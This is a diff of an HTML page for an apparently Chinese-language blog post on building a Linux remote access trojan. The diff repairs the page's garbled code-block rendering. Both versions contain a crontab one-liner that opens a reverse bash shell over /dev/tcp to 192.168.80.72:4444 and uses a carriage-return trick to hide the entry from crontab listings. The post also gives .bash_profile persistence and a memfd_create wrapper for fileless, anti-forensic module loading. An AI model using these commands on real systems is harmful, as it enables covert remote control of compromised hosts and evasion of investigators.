@@ -27,7 +27,7 @@
 <meta property="og:site_name">
 <meta property="og:description" content="在开发自己的RAT的过程当中遇到了不少有意思的点，涉及自身的隐藏与反取证。以此记录一下相关的知识点">
 <meta property="article:published_time" content="2020-09-17T06:11:10.000Z">
-<meta property="article:modified_time" content="2020-09-18T08:56:15.431Z">
+<meta property="article:modified_time" content="2020-09-18T08:58:55.311Z">
 <meta property="article:author" content="ph4ntom">
 <meta property="article:tag" content="渗透,后门">
 <meta name="twitter:card" content="summary">
@@ -180,7 +180,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-18 16:56:15" itemprop="dateModified" datetime="2020-09-18T16:56:15+08:00">2020-09-18</time>
+                <time title="Modified: 2020-09-18 16:58:55" itemprop="dateModified" datetime="2020-09-18T16:58:55+08:00">2020-09-18</time>
               </span>
 
           
@@ -209,15 +209,19 @@
 <h2 id="复活"><a href="#复活" class="headerlink" title="复活"></a>复活</h2><p>当RAT被发现并杀死后，为了使得RAT能够重新上线，在普通用户的权限下也有一些操作可以做</p>
 <h3 id="修改crontab"><a href="#修改crontab" class="headerlink" title="修改crontab"></a>修改crontab</h3><p>这个玩烂了，而且大家都会去查，所以不多做讨论</p>
 <p>不过有个trick还能用用，即</p>
-<figure class="highlight plain"><figcaption><span>-l;printf "*/60 * * * * exec 9<></span><a href="/dev/tcp/192.168.80.72/4444;exec">0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n")|crontab - ```</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">通过cat命令解析\r，即回到行开头，之后使用%100c生成100个空字符“覆盖”前面的语句，以此使得crontab -l 以及 cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx 无法看到定时任务</span><br><span class="line"></span><br><span class="line">### 修改或添加.bash_profile</span><br><span class="line"></span><br><span class="line">.bash_profile这个文件当中的命令将会在对应用户登录时执行，只需要在其中加入&#96;&#96;&#96;setsid &#x2F;xxx&#x2F;xxx&#x2F;xxxxx &amp;&#96;&#96;&#96; 就可以保证在用户每一次ssh时，重启RAT</span><br><span class="line"></span><br><span class="line">## 反取证</span><br><span class="line"></span><br><span class="line">## &#x2F;dev&#x2F;shm加载</span><br><span class="line"></span><br><span class="line">在RAT的设计中，为了反取证，应将RAT模块化，并使其模块在内存加载，做到除了dropper之外，关键模块不落地</span><br><span class="line"></span><br><span class="line">在linux kernel的3.17版本后，在sys&#x2F;mman.h存在memfd_create函数，此函数可以直接在内存中分配空间，创建虚拟文件，并返回内存中的fd，从而实现模块不落地的功能，并且在&#x2F;dev&#x2F;shm下是无法看见这个文件的</span><br><span class="line"></span><br><span class="line">在3.17版本之前，也可以用shm_open函数创建虚拟的fd，但是由shm_open函数创建的fd在&#x2F;dev&#x2F;shm下是可以用ls看见的</span><br><span class="line"></span><br><span class="line">由于linux没有封装memfd_create函数，所以需要以下关键代码</span><br></pre></td></tr></table></figure>
-<p>static inline int memfd_create(const char *name, unsigned int flags) {<br>  return syscall(__NR_memfd_create, name, flags);<br>}</p>
-<pre><code>
-通过syscall来自行封装此函数
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.80.72&#x2F;4444;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
 
+<p>通过cat命令解析\r，即回到行开头，之后使用%100c生成100个空字符“覆盖”前面的语句，以此使得crontab -l 以及 cat /var/spool/cron/crontabs/xxx 无法看到定时任务</p>
+<h3 id="修改或添加-bash-profile"><a href="#修改或添加-bash-profile" class="headerlink" title="修改或添加.bash_profile"></a>修改或添加.bash_profile</h3><p>.bash_profile这个文件当中的命令将会在对应用户登录时执行，只需要在其中加入<code>setsid /xxx/xxx/xxxxx &amp;</code> 就可以保证在用户每一次ssh时，重启RAT</p>
+<h2 id="反取证"><a href="#反取证" class="headerlink" title="反取证"></a>反取证</h2><h2 id="dev-shm加载"><a href="#dev-shm加载" class="headerlink" title="/dev/shm加载"></a>/dev/shm加载</h2><p>在RAT的设计中，为了反取证，应将RAT模块化，并使其模块在内存加载，做到除了dropper之外，关键模块不落地</p>
+<p>在linux kernel的3.17版本后，在sys/mman.h存在memfd_create函数，此函数可以直接在内存中分配空间，创建虚拟文件，并返回内存中的fd，从而实现模块不落地的功能，并且在/dev/shm下是无法看见这个文件的</p>
+<p>在3.17版本之前，也可以用shm_open函数创建虚拟的fd，但是由shm_open函数创建的fd在/dev/shm下是可以用ls看见的</p>
+<p>由于linux没有封装memfd_create函数，所以需要以下关键代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</span><br><span class="line">  return syscall(__NR_memfd_create, name, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-# root
+<p>通过syscall来自行封装此函数</p>
+<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><p>未完待续</p>
 
-未完待续</code></pre>
     </div>
 
     
@@ -297,7 +301,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#普通用户-非root"><span class="nav-number">1.</span> <span class="nav-text">普通用户(非root)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏"><span class="nav-number">1.1.</span> <span class="nav-text">隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#篡改进程名"><span class="nav-number">1.1.1.</span> <span class="nav-text">篡改进程名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复活"><span class="nav-number">1.2.</span> <span class="nav-text">复活</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修改crontab"><span class="nav-number">1.2.1.</span> <span class="nav-text">修改crontab</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#普通用户-非root"><span class="nav-number">1.</span> <span class="nav-text">普通用户(非root)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏"><span class="nav-number">1.1.</span> <span class="nav-text">隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#篡改进程名"><span class="nav-number">1.1.1.</span> <span class="nav-text">篡改进程名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复活"><span class="nav-number">1.2.</span> <span class="nav-text">复活</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修改crontab"><span class="nav-number">1.2.1.</span> <span class="nav-text">修改crontab</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改或添加-bash-profile"><span class="nav-number">1.2.2.</span> <span class="nav-text">修改或添加.bash_profile</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反取证"><span class="nav-number">1.3.</span> <span class="nav-text">反取证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dev-shm加载"><span class="nav-number">1.4.</span> <span class="nav-text">&#x2F;dev&#x2F;shm加载</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#root"><span class="nav-number">2.</span> <span class="nav-text">root</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
